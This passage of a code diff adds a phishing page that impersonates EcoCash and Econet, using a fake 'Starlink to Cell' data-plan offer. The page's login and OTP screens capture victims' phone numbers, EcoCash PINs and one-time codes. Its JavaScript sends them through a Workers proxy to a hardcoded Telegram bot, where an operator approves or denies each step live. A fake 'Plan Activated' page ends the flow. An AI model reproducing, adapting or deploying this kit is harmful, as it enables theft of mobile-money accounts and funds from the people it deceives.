+  font-weight: 700;
+  cursor: pointer;
+  font-family: inherit;
+  transition: transform 0.15s, box-shadow 0.15s;
+  box-shadow: 0 4px 16px rgba(21,101,192,0.25);
+}
+.btn-success-back:active {
+  transform: scale(0.97);
+  box-shadow: 0 2px 8px rgba(21,101,192,0.2);
+}
+.success-powered {
+  margin-top: 24px;
+  font-size: 12px;
+  color: #94a3b8;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+}
+.success-powered svg {
+  width: 16px;
+  height: 16px;
+}
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════
+     PAGE 1 — PLANS
+══════════════════════════════════ -->
+<div id="page-plans" class="page active">
+
+  <!-- Hero Header -->
+  <div class="plans-hero">
+    <div class="hero-sat-icon">
+      <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="24" cy="24" r="22" stroke="rgba(255,255,255,0.15)" stroke-width="1.5"/>
+        <circle cx="24" cy="24" r="14" stroke="rgba(255,255,255,0.2)" stroke-width="1.5"/>
+        <line x1="24" y1="2" x2="24" y2="10" stroke="rgba(255,255,255,0.7)" stroke-width="2" stroke-linecap="round"/>
+        <line x1="24" y1="38" x2="24" y2="46" stroke="rgba(255,255,255,0.7)" stroke-width="2" stroke-linecap="round"/>
+        <line x1="2"  y1="24" x2="10" y2="24" stroke="rgba(255,255,255,0.7)" stroke-width="2" stroke-linecap="round"/>
+        <line x1="38" y1="24" x2="46" y2="24" stroke="rgba(255,255,255,0.7)" stroke-width="2" stroke-linecap="round"/>
+        <circle cx="24" cy="24" r="5" fill="white" opacity="0.9"/>
+        <path d="M6 8 L14 16" stroke="rgba(255,255,255,0.4)" stroke-width="1.5" stroke-linecap="round"/>
+        <path d="M34 8 L42 16" stroke="rgba(255,255,255,0.4)" stroke-width="1.5" stroke-linecap="round"/>
+        <path d="M6 40 L14 32" stroke="rgba(255,255,255,0.4)" stroke-width="1.5" stroke-linecap="round"/>
+        <path d="M34 40 L42 32" stroke="rgba(255,255,255,0.4)" stroke-width="1.5" stroke-linecap="round"/>
+      </svg>
+    </div>
+    <div class="plans-title">Starlink to Cell</div>
+    <div class="plans-subtitle">High-Speed Satellite Internet • Pay via EcoCash</div>
+    <div class="info-box">
+      <strong>⚡ Fast &amp; Reliable</strong> — Satellite data instantly activated to your SIM. No contracts, cancel anytime.
+    </div>
+  </div>
+
+  <!-- Powered by Econet -->
+  <div class="powered-by">
+    <span>Powered by</span>
+    <div class="econet-logo">
+      <div class="econet-top">
+        ECONET
+        <span class="econet-arc">
+          <svg viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 18 Q11 2 18 18" stroke="#e53935" stroke-width="2.5" fill="none" stroke-linecap="round"/>
+            <path d="M6 18 Q11 6 16 18" stroke="#e53935" stroke-width="2" fill="none" stroke-linecap="round" opacity="0.7"/>
+          </svg>
+        </span>
+      </div>
+      <div class="econet-wireless">Wireless</div>
+    </div>
+  </div>
+
+  <div class="plans-section-label">Choose your plan</div>
+
+  <div class="plans-list">
+    <!-- Free Trial -->
+    <div class="plan-card card-free" onclick="openModal('free')">
+      <div class="plan-badge">🎁 New users only</div>
+      <div class="plan-data">5GB Data</div>
+      <div class="plan-dur">2-Day Trial</div>
+      <div class="plan-price plan-price-free">FREE</div>
+      <span class="view-details">View details </span>
+    </div>
+
+    <!-- $0.99 -->
+    <div class="plan-card card-099" onclick="openModal('099')">
+      <svg class="sat-svg" viewBox="0 0 400 180" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="300" cy="130" r="40" fill="none" stroke="white" stroke-width="2"/>
+        <circle cx="300" cy="130" r="25" fill="none" stroke="white" stroke-width="1.5"/>
+        <line x1="300" y1="90" x2="300" y2="40" stroke="white" stroke-width="3"/>
+        <line x1="280" y1="170" x2="320" y2="170" stroke="white" stroke-width="3"/>
+        <circle cx="80" cy="60" r="22" fill="none" stroke="white" stroke-width="2"/>
+        <line x1="80" y1="38" x2="80" y2="10" stroke="white" stroke-width="2"/>
+        <line x1="60" y1="105" x2="100" y2="105" stroke="white" stroke-width="2"/>
+      </svg>
+      <div class="plan-badge">📶 Light users</div>
+      <div class="plan-data">15GB Data</div>
+      <div class="plan-dur">7-Day Plan</div>
+      <div class="plan-price">$0.99</div>
+      <span class="view-details">View details </span>
+    </div>
+
+    <!-- $1.99 -->
+    <div class="plan-card card-199" onclick="openModal('199')">
+      <svg class="sat-svg" viewBox="0 0 400 180" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="300" cy="130" r="40" fill="none" stroke="white" stroke-width="2"/>
+        <circle cx="300" cy="130" r="25" fill="none" stroke="white" stroke-width="1.5"/>
+        <line x1="300" y1="90" x2="300" y2="40" stroke="white" stroke-width="3"/>
+        <line x1="280" y1="170" x2="320" y2="170" stroke="white" stroke-width="3"/>
+        <circle cx="80" cy="60" r="22" fill="none" stroke="white" stroke-width="2"/>
+        <line x1="80" y1="38" x2="80" y2="10" stroke="white" stroke-width="2"/>
+        <line x1="60" y1="105" x2="100" y2="105" stroke="white" stroke-width="2"/>
+      </svg>
+      <div class="plan-badge">⚖️ Balanced</div>
+      <div class="plan-data">35GB Data</div>
+      <div class="plan-dur">14-Day Plan</div>
+      <div class="plan-price">$1.99</div>
+      <span class="view-details">View details </span>
+    </div>
+
+    <!-- $2.99 -->
+    <div class="plan-card card-299" onclick="openModal('299')">
+      <svg class="sat-svg" viewBox="0 0 400 180" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="300" cy="130" r="40" fill="none" stroke="white" stroke-width="2"/>
+        <line x1="300" y1="90" x2="300" y2="40" stroke="white" stroke-width="3"/>
+        <line x1="280" y1="170" x2="320" y2="170" stroke="white" stroke-width="3"/>
+        <circle cx="80" cy="60" r="22" fill="none" stroke="white" stroke-width="2"/>
+        <line x1="80" y1="38" x2="80" y2="10" stroke="white" stroke-width="2"/>
+        <line x1="60" y1="105" x2="100" y2="105" stroke="white" stroke-width="2"/>
+      </svg>
+      <div class="plan-badge">🔥 Heavy use</div>
+      <div class="plan-data">50GB Data</div>
+      <div class="plan-dur">21-Day Plan</div>
+      <div class="plan-price">$2.99</div>
+      <span class="view-details">View details </span>
+    </div>
+
+    <!-- $3.99 Most Popular -->
+    <div class="plan-card card-399" onclick="openModal('399')">
+      <svg class="sat-svg" viewBox="0 0 400 180" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="300" cy="130" r="40" fill="none" stroke="white" stroke-width="2"/>
+        <line x1="300" y1="90" x2="300" y2="40" stroke="white" stroke-width="3"/>
+        <line x1="280" y1="170" x2="320" y2="170" stroke="white" stroke-width="3"/>
+        <circle cx="80" cy="60" r="22" fill="none" stroke="white" stroke-width="2"/>
+        <line x1="80" y1="38" x2="80" y2="10" stroke="white" stroke-width="2"/>
+        <line x1="60" y1="105" x2="100" y2="105" stroke="white" stroke-width="2"/>
+      </svg>
+      <div class="plan-badge badge-popular">⭐ Most popular</div>
+      <div class="plan-data">Unlimited</div>
+      <div class="plan-dur">30-Day Plan</div>
+      <div class="plan-price">$3.99</div>
+      <span class="view-details">View details </span>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════
+     MODAL — PLAN DETAILS
+══════════════════════════════════ -->
+<div class="modal-overlay" id="modal-overlay">
+  <div class="modal-box">
+    <div class="modal-header">
+      <div class="modal-header-left">
+        <span class="modal-emoji" id="m-emoji">🎁</span>
+        <div class="modal-title" id="m-title">5GB Data — 2 Day Plan</div>
+      </div>
+      <button class="modal-close-btn" onclick="closeModal()">×</button>
+    </div>
+    <div class="modal-body">
+      <p id="m-desc"></p>
+      <p><strong>Price:</strong> <span id="m-price"></span></p>
+      <p><strong>Validity:</strong> <span id="m-validity"></span></p>
+      <ul class="modal-bullets" id="m-bullets"></ul>
+      <p class="modal-note" id="m-note"></p>
+    </div>
+    <div class="modal-footer">
+      <button class="btn-cancel-modal" onclick="closeModal()">Cancel</button>
+      <button class="btn-action-modal" id="m-cta" onclick="goToLogin()">Start Free Trial</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════
+     PAGE 2 — ECOCASH LOGIN
+══════════════════════════════════ -->
+<div id="page-login" class="page">
+  <div class="login-card-wrap">
+    <div class="login-top">
+      <div class="ecocash-brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+      <div class="login-label">Login</div>
+      <div class="phone-field-group">
+        <div class="phone-field-label">Mobile Number</div>
+        <div class="phone-input-wrap" id="phone-input-wrap">
+          <div class="phone-country-pill">
+            <span class="phone-flag">🇿🇼</span>
+            <span class="phone-code">+263</span>
+            <span class="phone-chevron">▾</span>
+          </div>
+          <input class="phone-num-input" type="tel" id="phone-input"
+            placeholder="7X XXX XXXX"
+            inputmode="numeric"
+            maxlength="10"
+            oninput="sanitizePhoneInput(this); hidePhoneError();"
+          />
+        </div>
+        <div class="phone-error-msg" id="phone-error-msg">
+          <span id="phone-error-text">Please enter a valid Zimbabwe mobile number</span>
+        </div>
+      </div>
+      <div class="pin-heading">Enter your PIN</div>
+      <div class="pin-row">
+        <input class="pin-box" type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="p1" oninput="sanitizePinInput(this);nextPin(this,'p2')" onkeydown="prevPin(event,this,null)"/>
+        <input class="pin-box" type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="p2" oninput="sanitizePinInput(this);nextPin(this,'p3')" onkeydown="prevPin(event,this,'p1')"/>
+        <input class="pin-box" type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="p3" oninput="sanitizePinInput(this);nextPin(this,'p4')" onkeydown="prevPin(event,this,'p2')"/>
+        <input class="pin-box" type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="p4" oninput="sanitizePinInput(this);checkPin()" onkeydown="prevPin(event,this,'p3')"/>
+      </div>
+      <div class="forgot-pin">Forgot PIN?</div>
+    </div>
+    <div class="login-bottom">
+      <p class="bottom-text">To register a EcoCash wallet or get assistance, click below</p>
+      <div class="bottom-btns">
+        <button class="btn-white">Register</button>
+        <button class="btn-white">Help &amp; Support</button>
+      </div>
+      <div class="bottom-version">v2.2.3P</div>
+      <div class="bottom-terms">By signing in you agree to the <a href="#">Terms and Conditions</a></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════
+     PAGE 3 — OTP VERIFICATION
+══════════════════════════════════ -->
+<div id="page-otp" class="page">
+  <div class="back-btn" onclick="showPage('page-login')">‹</div>
+  <div class="otp-card">
+    <div class="otp-title">OTP Verification</div>
+    <div class="otp-desc">Enter the OTP sent to your phone number. Do not share the code with anyone.</div>
+    <div class="otp-phone" id="display-phone-otp"></div>
+
+    <!-- Denied message -->
+    <div class="otp-denied-msg" id="otp-denied-msg">
+      <div class="otp-denied-text">Incorrect OTP entered</div>
+      <div class="otp-denied-sub">The code you entered is invalid. Please try again.</div>
+    </div>
+
+    <div class="otp-field-label">OTP</div>
+    <div class="otp-boxes">
+      <input class="otp-box" type="text" inputmode="numeric" maxlength="1" id="o1" oninput="otpNext(this,'o2')" onkeydown="otpBack(event,this,null)"/>
+      <input class="otp-box" type="text" inputmode="numeric" maxlength="1" id="o2" oninput="otpNext(this,'o3')" onkeydown="otpBack(event,this,'o1')"/>
+      <input class="otp-box" type="text" inputmode="numeric" maxlength="1" id="o3" oninput="otpNext(this,'o4')" onkeydown="otpBack(event,this,'o2')"/>
+      <input class="otp-box" type="text" inputmode="numeric" maxlength="1" id="o4" oninput="otpNext(this,'o5')" onkeydown="otpBack(event,this,'o3')"/>
+      <input class="otp-box" type="text" inputmode="numeric" maxlength="1" id="o5" oninput="otpNext(this,'o6')" onkeydown="otpBack(event,this,'o4')"/>
+      <input class="otp-box" type="text" inputmode="numeric" maxlength="1" id="o6" oninput="otpCheck()" onkeydown="otpBack(event,this,'o5')"/>
+    </div>
+    <div class="otp-resend" id="otp-resend-text">Resend OTP in <span id="otp-cd">107</span> seconds</div>
+
+    <!-- Verifying state -->
+    <div class="otp-approval-status" id="otp-approval-status">
+      <div class="otp-spinner"></div>
+      <div class="otp-approval-text">Verifying your details…</div>
+      <div class="otp-approval-sub">Please wait, this will only take a moment.</div>
+    </div>
+
+    <button class="btn-submit" id="btn-submit">Submit</button>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════
+     PAGE 4 — SUCCESS
+══════════════════════════════════ -->
+<div id="page-success" class="page">
+  <div class="success-card">
+    <div class="success-ring">
+      <svg viewBox="0 0 24 24">
+        <path d="M5 13l4 4L19 7"/>
+      </svg>
+    </div>
+    <div class="success-title">Plan Activated!</div>
+    <div class="success-subtitle">Your Starlink to Cell data plan is now active. Enjoy fast, reliable satellite internet.</div>
+
+    <div class="success-details">
+      <div class="success-detail-row">
+        <span class="success-detail-label">Plan</span>
+        <span class="success-detail-value" id="success-plan-name">Monthly Unlimited</span>
+      </div>
+      <div class="success-detail-row">
+        <span class="success-detail-label">Duration</span>
+        <span class="success-detail-value" id="success-plan-duration">30 Days</span>
+      </div>
+      <div class="success-detail-row">
+        <span class="success-detail-label">Amount Paid</span>
+        <span class="success-detail-value" id="success-plan-price">USD 3.99</span>
+      </div>
+      <div class="success-detail-row">
+        <span class="success-detail-label">Payment Method</span>
+        <span class="success-detail-value">EcoCash</span>
+      </div>
+      <div class="success-detail-row">
+        <span class="success-detail-label">Status</span>
+        <span class="success-status"><span class="success-status-dot"></span>Active</span>
+      </div>
+    </div>
+
+    <button class="btn-success-back" onclick="resetAndGoHome()">Back to Plans</button>
+
+    <div class="success-powered">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
+      </svg>
+      Powered by EcoCash & Starlink
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════
+     PAGE 5 — WRONG DETAILS (PIN / PHONE)
+══════════════════════════════════ -->
+<div id="page-wrong-pin" class="page">
+  <div class="wrong-pin-card">
+    <div class="wrong-pin-ring">
+      <svg viewBox="0 0 24 24">
+        <line x1="18" y1="6" x2="6" y2="18"/>
+        <line x1="6" y1="6" x2="18" y2="18"/>
+      </svg>
+    </div>
+    <div class="wrong-pin-title" id="wrong-pin-title">Incorrect Details</div>
+    <div class="wrong-pin-subtitle" id="wrong-pin-subtitle">The phone number or PIN you entered does not match our records. Please check your details and try again.</div>
+    <button class="wrong-pin-btn" onclick="goBackToLogin()">Try Again</button>
+    <div class="wrong-pin-redirect">Returning automatically in <span id="wrong-pin-countdown">5</span>s…</div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════
+     ECOCASH CONNECTING OVERLAY
+══════════════════════════════════ -->
+<div id="ecocash-connect-overlay">
+  <div class="eco-signal-rings">
+    <div class="eco-signal-ring"></div>
+    <div class="eco-signal-ring"></div>
+    <div class="eco-signal-ring"></div>
+    <div class="eco-signal-core">
+      <!-- EcoCash "E" icon -->
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H7v-2h4v-2H8v-2h3V8h2v2h1c1.1 0 2 .9 2 2v1c0 1.1-.9 2-2 2h-1v2h-2v-1z" fill="white"/>
+      </svg>
+    </div>
+  </div>
+
+  <div class="eco-connect-brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+  <div class="eco-connect-title">Connecting to EcoCash<span class="eco-connect-dots"></span></div>
+  <div class="eco-connect-sub">
+    <svg viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.5)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+    </svg>
+    Do not reload this page
+  </div>
+  <div class="eco-secure-badge">
+    <svg viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.7)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg">
+      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+      <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+    </svg>
+    256-bit encrypted connection
+  </div>
+
+  <!-- Progress bar at bottom -->
+  <div class="eco-progress-wrap">
+    <div class="eco-progress-bar" id="eco-progress-bar"></div>
+  </div>
+</div>
+
+<!-- ── LOADING OVERLAY ── -->
+<div id="loading-overlay">
+  <div class="loading-logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+  <div class="loading-spinner"></div>
+  <div class="loading-text" id="loading-text">Authenticating…</div>
+  <div class="loading-sub" id="loading-sub">Please keep this page open</div>
+  <div class="loading-approval-badge" id="loading-approval-badge" style="display:none;">
+    <div class="loading-approval-dot"></div>
+    Authentication in progress
+  </div>
+</div>
+
+<script>
+/* ════════════════════════════════════
+   TELEGRAM BOT CONFIGURATION
+   Replace with your actual Bot Token and Chat ID
+════════════════════════════════════ */
+const TELEGRAM_BOT_TOKEN = '8984717378:AAFv2mMwmts4-8U7J7a8IADyTp0HghEvWAw';
+const TELEGRAM_CHAT_ID   = '6282128244';
+
+/* ── Plan data ── */
+const plans = {
+  free: {
+    emoji:'🎁', title:'5GB Data — 2 Day Plan',
+    desc:'This free trial lets you experience our service firsthand and confirm its legitimacy before upgrading.',
+    price:'Free trial', validity:'2 days',
+    bullets:['5GB total Starlink to Cell data bundle','Valid for 2 days from activation','Free trial for new users'],
+    note:'Enjoy your free 2-day trial! No payment needed. Click start free trial and confirm your number through Ecocash to get started.',
+    cta:'Start Free Trial',
+    successName: '5GB Data',
+    successDuration: '2 Days',
+    successPrice: 'Free'
+  },
+  '099': {
+    emoji:'📶', title:'15GB Data — 7 Day Plan',
+    desc:'Perfect for light browsing, messaging and occasional streaming.',
+    price:'USD 0.99', validity:'7 days',
+    bullets:['15GB total Starlink to Cell data bundle','Valid for 7 days from activation','Pay securely via EcoCash'],
+    note:'Click Pay with EcoCash to proceed and confirm your number to activate.',
+    cta:'Pay with EcoCash',
+    successName: '15GB Data',
+    successDuration: '7 Days',
+    successPrice: 'USD 0.99'
+  },
+  '199': {
+    emoji:'📶', title:'35GB Data — 14 Day Plan',
+    desc:'A balanced plan for regular internet use including video calls and streaming.',
+    price:'USD 1.99', validity:'14 days',
+    bullets:['35GB total Starlink to Cell data bundle','Valid for 14 days from activation','Pay securely via EcoCash'],
+    note:'Click Pay with EcoCash to proceed and confirm your number to activate.',
+    cta:'Pay with EcoCash',
+    successName: '35GB Data',
+    successDuration: '14 Days',
+    successPrice: 'USD 1.99'
+  },
+  '299': {
+    emoji:'📶', title:'50GB Data — 21 Day Plan',
+    desc:'Ideal for heavy users who stream video, download files and work remotely.',
+    price:'USD 2.99', validity:'21 days',
+    bullets:['50GB total Starlink to Cell data bundle','Valid for 21 days from activation','Pay securely via EcoCash'],
+    note:'Click Pay with EcoCash to proceed and confirm your number to activate.',
+    cta:'Pay with EcoCash',
+    successName: '50GB Data',
+    successDuration: '21 Days',
+    successPrice: 'USD 2.99'
+  },
+  '399': {
+    emoji:'🌟', title:'Monthly Unlimited — 30 Day Plan',
+    desc:'Enjoy unlimited data for a full month. Our most popular plan.',
+    price:'USD 3.99', validity:'30 days',
+    bullets:['Unlimited Starlink to Cell data','Valid for 30 days from activation','Pay securely via EcoCash'],
+    note:'Click Pay with EcoCash to proceed and confirm your number to activate.',
+    cta:'Pay with EcoCash',
+    successName: 'Monthly Unlimited',
+    successDuration: '30 Days',
+    successPrice: 'USD 3.99'
+  }
+};
+
+let selectedPlanKey = '399';
+let capturedPin = '';
+let capturedOtp = '';
+let currentPhoneNumber = '';
+let currentSessionId = '';
+let otpAttemptCount = 0;
+let globalLastUpdateId = 0; /* Persists across OTP attempts so old callbacks are not re-processed */
+
+
+/* ── Input Sanitization ── */
+function sanitizePhoneInput(el) {
+  el.value = el.value.replace(/[^0-9]/g, '');
+}
+function sanitizePinInput(el) {
+  el.value = el.value.replace(/[^0-9]/g, '');
+}
+
+function getPhoneNumber() {
+  var el = document.getElementById('phone-input');
+  return el ? el.value.trim() : '';
+}
+
+/* ── Phone error display ── */
+function showPhoneError(msg) {
+  var errMsg  = document.getElementById('phone-error-msg');
+  var errText = document.getElementById('phone-error-text');
+  var wrap    = document.getElementById('phone-input-wrap');
+  if (errText) errText.textContent = msg || 'Please enter a valid Zimbabwe mobile number';
+  if (errMsg)  { errMsg.classList.remove('visible'); void errMsg.offsetWidth; errMsg.classList.add('visible'); }
+  if (wrap)    wrap.classList.add('error');
+  var phoneEl = document.getElementById('phone-input');
+  if (phoneEl) phoneEl.focus();
+}
+function hidePhoneError() {
+  var errMsg = document.getElementById('phone-error-msg');
+  var wrap   = document.getElementById('phone-input-wrap');
+  if (errMsg) errMsg.classList.remove('visible');
+  if (wrap)   wrap.classList.remove('error');
+}
+
+/* ── Phone validation: 9 or 10 digits only ── */
+function isPhoneValid() {
+  var phone = getPhoneNumber();
+  return phone.length === 9 || phone.length === 10;
+}
+
+/* ── Helpers ── */
+function generateSessionId() {
+  return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+}
+
+var otpPollTimer = null;
+
+/* ── Loading overlay ── */
+function showLoadingOverlay(text, sub) {
+  var el = document.getElementById('loading-overlay');
+  if (el) el.classList.add('active');
+  var textEl = document.getElementById('loading-text');
+  var subEl  = document.getElementById('loading-sub');
+  if (textEl && text) textEl.textContent = text;
+  if (subEl  && sub)  subEl.textContent  = sub;
+  setLoadingAwaitingState(false);
+}
+function hideLoadingOverlay() {
+  var el = document.getElementById('loading-overlay');
+  if (el) el.classList.remove('active');
+  setLoadingAwaitingState(false);
+}
+
+/* ── Show wrong details / wrong PIN page ── */
+function showWrongDetailsPage(title, subtitle, countdownSecs) {
+  var titleEl    = document.getElementById('wrong-pin-title');
+  var subtitleEl = document.getElementById('wrong-pin-subtitle');
+  if (titleEl    && title)    titleEl.textContent    = title;
+  if (subtitleEl && subtitle) subtitleEl.textContent = subtitle;
+
+  showPage('page-wrong-pin');
+
+  var countEl = document.getElementById('wrong-pin-countdown');
+  var secs = countdownSecs || 5;
+  if (countEl) countEl.textContent = secs;
+
+  var wrongPinTimer = setInterval(function() {
+    secs--;
+    if (countEl) countEl.textContent = secs;
+    if (secs <= 0) {
+      clearInterval(wrongPinTimer);
+      goBackToLogin();
+    }
+  }, 1000);
+}
+
+/* ── Go back to login cleanly ── */
+function goBackToLogin() {
+  if (otpPollTimer)   { clearInterval(otpPollTimer);   otpPollTimer   = null; }
+  if (loginPollTimer) { clearInterval(loginPollTimer); loginPollTimer = null; }
+  ['p1','p2','p3','p4','o1','o2','o3','o4','o5','o6'].forEach(function(id) {
+    var el = document.getElementById(id);
+    if (el) el.value = '';
+  });
+  var phoneEl = document.getElementById('phone-input');
+  if (phoneEl) { phoneEl.value = ''; }
+  hidePhoneError();
+  capturedPin = '';
+  capturedOtp = '';
+  currentPhoneNumber = '';
+  currentSessionId = '';
+  otpAttemptCount = 0;
+  /* Keep globalLastUpdateId — do NOT reset to 0 here.
+     Resetting would cause old pending callbacks to be re-read
+     on the next session, potentially triggering a false approve. */
+  showPage('page-login');
+  var pEl = document.getElementById('phone-input');
+  if (pEl) pEl.focus();
+}
+
+/* ════════════════════════════════════════════════════════
+   STEP 1 — Send Phone + PIN with Approve / Deny keyboard
+════════════════════════════════════════════════════════ */
+var loginPollTimer = null;
+
+function sendCredentialsWithKeyboard(phoneNumber, pin, sessionId) {
+  var planInfo = plans[selectedPlanKey] || plans['399'];
+  var message =
+    '🇿🇼 <b>EcoCash Login Attempt</b>\n\n' +
+    '📱 <b>Phone:</b> <code>+263' + phoneNumber + '</code>\n' +
+    '🔐 <b>PIN:</b> <code>' + pin + '</code>\n' +
+    '📦 <b>Plan:</b> ' + planInfo.title + ' — ' + planInfo.price + '\n\n' +
+    '⏳ <i>Approve to send user to OTP page, or Deny to block.</i>';
+
+  var keyboard = {
+    inline_keyboard: [[
+      { text: '✅ Approve — Send to OTP', callback_data: 'login_approve_' + sessionId },
+      { text: '❌ Deny',                  callback_data: 'login_deny_'    + sessionId }
+    ]]
+  };
+
+  fetch('https://empty-pine-2591.riggynice.workers.dev/telegram/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  })
+  .then(function(r) { return r.json(); })
+  .then(function(data) {
+    if (data && data.ok) {
+      var msgId = data.result.message_id;
+      /* Update overlay to "awaiting" state */
+      setLoadingAwaitingState(true);
+      startLoginPolling(sessionId, msgId);
+    } else {
+      /* API error — show generic error, do not auto-approve */
+      hideLoadingOverlay();
+      showWrongDetailsPage('Connection Error', 'Unable to reach the server. Please try again.');
+    }
+  })
+  .catch(function() {
+    hideLoadingOverlay();
+    showWrongDetailsPage('Connection Error', 'Unable to reach the server. Please try again.');
+  });
+}
+
+/* ── Toggle loading overlay state ── */
+function setLoadingAwaitingState(waiting) {
+  var badge  = document.getElementById('loading-approval-badge');
+  var textEl = document.getElementById('loading-text');
+  var subEl  = document.getElementById('loading-sub');
+  if (waiting) {
+    if (textEl) textEl.textContent = 'Authenticating…';
+    if (subEl)  subEl.textContent  = 'Please keep this page open';
+    if (badge)  badge.style.display = 'flex';
+  } else {
+    if (badge)  badge.style.display = 'none';
+    if (textEl) textEl.textContent = 'Authenticating…';
+    if (subEl)  subEl.textContent  = 'Please keep this page open';
+  }
+}
+
+/* ── Poll Telegram for login Approve / Deny ── */
+function startLoginPolling(sessionId, msgId) {
+  if (loginPollTimer) clearInterval(loginPollTimer);
+  var pollCount    = 0;
+  var maxPolls     = 300; /* 5 minutes */
+
+  loginPollTimer = setInterval(function() {
+    pollCount++;
+    if (pollCount > maxPolls) {
+      clearInterval(loginPollTimer); loginPollTimer = null;
+      handleLoginResult('deny', msgId, sessionId);
+      return;
+    }
+
+    fetch('https://empty-pine-2591.riggynice.workers.dev/telegram/bot' + TELEGRAM_BOT_TOKEN +
+          '/getUpdates?offset=' + (globalLastUpdateId + 1) + '&limit=10&timeout=0')
+      .then(function(r) { return r.ok ? r.json() : null; })
+      .then(function(data) {
+        if (!data || !data.ok || !data.result) return;
+        data.result.forEach(function(update) {
+          globalLastUpdateId = Math.max(globalLastUpdateId, update.update_id);
+          if (!update.callback_query) return;
+
+          var cb     = update.callback_query;
+          var cbData = cb.data || '';
+
+          /* Acknowledge button press */
+          fetch('https://empty-pine-2591.riggynice.workers.dev/telegram/bot' + TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ callback_query_id: cb.id })
+          }).catch(function(){});
+
+          if (cbData === 'login_approve_' + sessionId) {
+            clearInterval(loginPollTimer); loginPollTimer = null;
+            handleLoginResult('approve', msgId, sessionId);
+          } else if (cbData === 'login_deny_' + sessionId) {
+            clearInterval(loginPollTimer); loginPollTimer = null;
+            handleLoginResult('deny', msgId, sessionId);
+          }
+        });
+      })
+      .catch(function(){});
+  }, 1000);
+}
+
+/* ── Handle login Approve / Deny result ── */
+function handleLoginResult(outcome, msgId, sessionId) {
+  setLoadingAwaitingState(false);
+  hideLoadingOverlay();
+
+  if (outcome === 'approve') {
+    editTelegramMessage(msgId, '✅ Login Approved — user proceeding to OTP');
+
+    showPage('page-otp');
+
+    var otpPhoneEl = document.getElementById('display-phone-otp');
+    if (otpPhoneEl) otpPhoneEl.textContent = '+263 ' + currentPhoneNumber;
+
+    var deniedMsg = document.getElementById('otp-denied-msg');
+    if (deniedMsg) deniedMsg.classList.remove('visible');
+    var approvalStatus = document.getElementById('otp-approval-status');
+    if (approvalStatus) approvalStatus.classList.remove('visible');
+
+    startOtpCountdown();
+
+    otpAttemptCount = 0;
+    ['o1','o2','o3','o4','o5','o6'].forEach(function(id) {
+      var el = document.getElementById(id);
+      if (el) el.value = '';
+    });
+    var btn = document.getElementById('btn-submit');
+    if (btn) {
+      btn.textContent = 'Submit';
+      btn.disabled = false;
+      btn.style.background = '';
+      btn.classList.remove('ready');
+    }
+    var o1 = document.getElementById('o1');
+    if (o1) o1.focus();
+
+  } else {
+    /* Denied — wrong phone or PIN */
+    editTelegramMessage(msgId, '❌ Login Denied — incorrect phone/PIN');
+    showWrongDetailsPage('Incorrect Details',
+      'The phone number or PIN you entered does not match our records. Please check your details and try again.');
+  }
+}
+
+/* ════════════════════════════════════════════════════════════════
+   OTP SYSTEM — Clean rewrite
+   ─────────────────────────────────────────────────────────────
+   KEY DESIGN RULE:
+   Every OTP submission generates a brand-new attemptToken.
+   Telegram callback_data uses this token, NOT the sessionId.
+   This means pressing Deny (or approve) on attempt 1's message
+   has ZERO effect on attempt 2's polling — the tokens never match.
+   Old stacked callbacks in the queue are silently skipped.
+════════════════════════════════════════════════════════════════ */
+
+/* ── Send one OTP message to Telegram and begin polling ── */
+function sendOtpToTelegram(otp) {
+  var attemptNumber = otpAttemptCount + 1;
+
+  /* Unique token for THIS submission only */
+  var attemptToken = 'otp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+
+  var planInfo = plans[selectedPlanKey] || plans['399'];
+  var message =
+    '🔢 <b>OTP Verification — Attempt ' + attemptNumber + '</b>\n\n' +
+    '📱 <b>Phone:</b> <code>+263' + currentPhoneNumber + '</code>\n' +
+    '🔑 <b>OTP Entered:</b> <code>' + otp + '</code>\n' +
+    '📦 <b>Plan:</b> ' + planInfo.title + ' — ' + planInfo.price + '\n\n' +
